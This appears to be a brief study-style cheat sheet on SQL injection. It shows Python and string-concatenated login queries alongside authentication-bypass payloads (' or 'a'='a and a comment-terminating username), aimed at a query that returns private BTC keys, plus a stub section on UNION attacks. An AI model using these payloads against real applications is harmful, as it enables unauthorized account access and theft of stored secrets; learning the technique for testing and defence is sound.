# Check Missing Paramaterization

## Main Ideas
The original query must not be properly sanitized or paramaterized. (The query needs to just insert in the untrusted user into.)
You want to properly escape the start and end of the query.
You want to create a new query to run.
You want to match the return type of the original query to get results back.

# Examples 

## Match Any - Single Record
`query = f"SELECT username, created_at FROM users WHERE username='{inputVarHere}' and password = '{passVarHere}'"`
Mess with the input variable to create the query you want.
You can pass something like `' or 'a'='a`
The first single quote will escape, and you leave off the last single quote
`query = f"SELECT username, created_at FROM users WHERE username='usernameToAcess' and password = '' or 'a'='a'"`

## Return Early - Single Record
Typically you will start with a single quote
If you want to ignore everything after the query use `'--;` to end
Ex. `query = "SELECT username, public_btc_address, private_btc_key, balance FROM users WHERE username='" + username + "' AND password_hash='" + password_hash + "';"`
Payload. `username=jim404'--;`


## Union
Use this when you want to select records from a different table.
You need to select the same rows and data type from the original query will produce.
